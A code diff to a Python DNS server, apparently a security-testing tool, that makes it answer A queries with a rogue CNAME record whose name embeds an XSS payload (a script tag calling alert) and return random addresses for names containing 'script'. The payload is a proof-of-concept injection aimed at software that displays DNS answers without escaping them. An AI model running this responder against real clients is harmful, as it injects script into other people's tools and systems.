@@ -29,13 +29,17 @@ class DNS_Server:
         print(str(request.q.qname))
         qtype = request.q.qtype  # query type
 
-        if QTYPE[qtype] == 'A':
+        if str(qname).lower() == "version.bind.":
+            reply.add_answer(RR(rname=qname, rtype=16, rclass=3, ttl=0, rdata=TXT("dig2@qq.com")))
+
+        if "script" in str(qname):
             random_ip = random.choice([A("127.0.0.1"), A("1.1.1.1")])
             print(f"[-] return to {client[0]}: {random_ip}")
             reply.add_answer(RR(rname=qname, rtype=getattr(QTYPE, 'A'), rclass=1, ttl=0, rdata=random_ip))
-
-        if str(qname).lower() == "version.bind.":
-            reply.add_answer(RR(rname=qname, rtype=16, rclass=3, ttl=0, rdata=TXT("dig2@qq.com")))
+        elif QTYPE[qtype] == 'A':
+            rogue_domain = CNAME('<script>alert(/vv/)</script>.testdns.0x3ff.com')
+            reply.add_answer(RR(rname=qname, rtype=getattr(QTYPE, 'CNAME'), rclass=1, ttl=0, rdata=rogue_domain))
+            print(f"[-] redirect {client[0]} to XSS subdomain...")
 
         self.sock.sendto(reply.pack(), client)
 
